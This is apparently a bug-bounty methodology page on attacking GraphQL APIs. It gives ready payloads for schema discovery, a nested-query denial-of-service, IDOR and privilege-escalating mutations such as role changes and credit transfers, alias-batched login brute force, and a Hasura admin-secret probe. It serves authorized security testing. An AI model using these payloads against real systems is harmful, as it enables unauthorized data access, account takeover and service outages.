> Source: https://bugbounty.info/Attack-Surface/API/GraphQL

# GraphQL Testing

GraphQL changes the attack surface in interesting ways. Instead of N endpoints you have one, but the authorization model is fragmented across individual resolvers. Devs forget to add auth checks to resolvers that "nobody would call directly." They're wrong.

## Introspection When "Disabled"

Full introspection gets disabled in prod fairly often now. Doesn't matter. You can still fingerprint the schema.

**Field suggestion oracle:**

```bash
# GraphQL returns "Did you mean X?" when you query a field that almost exists
# This works even when introspection is disabled
{"query": "{ __typename utilizr { id } }"}
# Response: "Did you mean 'user'?"
 
# Tool: Clairvoyance automates this
python3 clairvoyance.py -u https://target.com/graphql -o schema.json
```

**__type queries that slip through:**

```graphql
# Even when __schema is blocked, __type sometimes isn't
{ __type(name: "User") { fields { name type { name kind } } } }
{ __type(name: "Query") { fields { name args { name type { name } } } } }
```

**Introspection via POST vs GET:**

```bash
# Some WAFs only block introspection on one method
GET /graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D
 
# Or try content-type switching
Content-Type: application/graphql   (vs application/json)
```

**GraphQL path variations:**

```bash
/graphql
/graphiql
/api/graphql
/v1/graphql
/query
/gql
```

## Query Depth / Complexity DoS

No query depth limits means you can nest until the server dies. This is easy to demonstrate, but check the scope rules before DoSing prod.

```graphql
# Classic nested query DoS
{
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends { id name }
          }
        }
      }
    }
  }
}
 
# Check if there's a depth limit - if you get a 200 with data 5 levels deep, keep going
# PoC: show response time degradation across depth levels
```

## Authorization Gaps in Resolvers

This is the highest-value bug class in GraphQL. The pattern: developer adds auth to `Query.adminUsers` but forgets that `User.adminNotes` (a nested field resolver) returns the same data.

```graphql
# Direct query blocked:
{ adminUsers { id email } }  # 403
 
# But nested access works:
{ me { friends { adminNotes } } }  # 200 with data
{ post(id: "123") { author { role internalFlags } } }
```

**IDOR via GraphQL:**

```graphql
# Basic - swap your ID for another
{ user(id: "victim_id") { email phone ssn } }
 
# Via object chaining
{ order(id: "not-your-order") { user { email paymentMethod { last4 } } } }
```

**Mutation auth gaps:**

```graphql
# Mutations are resolvers too. Test all of them.
mutation { deleteUser(id: "other_user_id") { success } }
mutation { updateUser(id: "other_user_id", role: "admin") { id role } }
mutation { transferCredits(fromId: "victim", toId: "attacker", amount: 1000) { newBalance } }
```

## Batching and Alias-Based Brute Force

GraphQL supports sending multiple operations in one request. Rate limits that count HTTP requests instead of operations are bypassable this way.

**Alias batching (single HTTP request, N checks):**

```graphql
{
  a1: login(username: "admin", password: "password1") { token }
  a2: login(username: "admin", password: "password2") { token }
  a3: login(username: "admin", password: "password3") { token }
  # ... repeat 100 times
}
```

**Array batching (some implementations support this):**

```json
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"}
]
```

**Tool: BatchQL**

```bash
python3 BatchQL.py -u https://target.com/graphql
```

## Tooling

```bash
# InQL - Burp extension, generates queries from introspection, finds hidden endpoints
# GraphQL Voyager - visualize schema relationships
# Altair GraphQL Client - better than GraphiQL for manual testing
 
# gql-cli for quick introspection
gql-cli https://target.com/graphql --print-schema > schema.graphql
 
# graphw00f - fingerprint GraphQL implementation (Apollo, Hasura, etc.)
# Different implementations have different known vulns
python3 graphw00f.py -d -t https://target.com/graphql
```

## Hasura-Specific

If the target runs Hasura, look for admin console exposure and the `x-hasura-admin-secret` header. Hasura's permission model is declarative - misconfigurations are common and you can often read full tables via the API.

```bash
# Check if admin console is exposed
https://target.com/console
https://target.com/hasura/console
 
# Test if admin secret check is missing
curl -H "x-hasura-admin-secret: " https://target.com/v1/graphql \
  -d '{"query":"{__schema{queryType{name}}}"}'
```

## Public Reports

- GraphQL introspection enabled leaking full schema on DoD asset - [HackerOne #1014964](https://hackerone.com/reports/1014964)
- Broken object level authorisation via GraphQL query on production API - [HackerOne #645921](https://hackerone.com/reports/645921)
- GraphQL batching attack bypasses rate limiting on login endpoint - [HackerOne #1445575](https://hackerone.com/reports/1445575)
- Unauthenticated GraphQL introspection exposing admin mutations - [HackerOne #1292510](https://hackerone.com/reports/1292510)
- BOLA via GraphQL nested resolver on Shopify - [HackerOne #496349](https://hackerone.com/reports/496349)

## See Also

- [REST](../../Attack-Surface/API/REST) - BOLA/IDOR applies equally here
- [API Gateway Bypass](../../Attack-Surface/API/API-Gateway-Bypass) - introspection disabling is often done at the gateway
